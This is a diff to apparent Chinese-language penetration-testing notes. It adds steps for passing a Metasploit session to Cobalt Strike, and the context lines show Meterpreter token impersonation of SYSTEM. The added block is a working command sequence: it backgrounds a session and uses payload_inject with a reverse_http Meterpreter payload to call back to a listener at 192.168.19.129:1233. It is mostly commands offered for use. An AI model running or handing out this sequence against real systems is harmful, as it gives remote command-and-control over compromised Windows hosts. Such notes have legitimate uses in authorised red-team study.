@@ -158,6 +158,20 @@ list_tokens -u
 impersonate_token "NT AUTHORITY\SYSTEM"
 getuid
 ```
+
+msf联动cs
+```css
+回到msf，输入background，将我们得到的会话放在后台
+use exploit/windows/local/payload_inject
+set payload windows/meterpreter/reverse_http
+set lport 1233 #cobaltstrike监听的端口
+set lhost 192.168.19.129 #cobaltstrike监听的ip
+set disablepayloadhandler true #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，所以这里我们设置为true
+set session 1 #这里是获得的session的id
+**打开cs 开启监听，端口为1233，点击add添加监听*
+```
+
+
 参考链接
 [使用hashcat爆破各种hash | 若水斋](https://blog.werner.wiki/use-hashcat-crack-all-kinds-of-hash/)
 
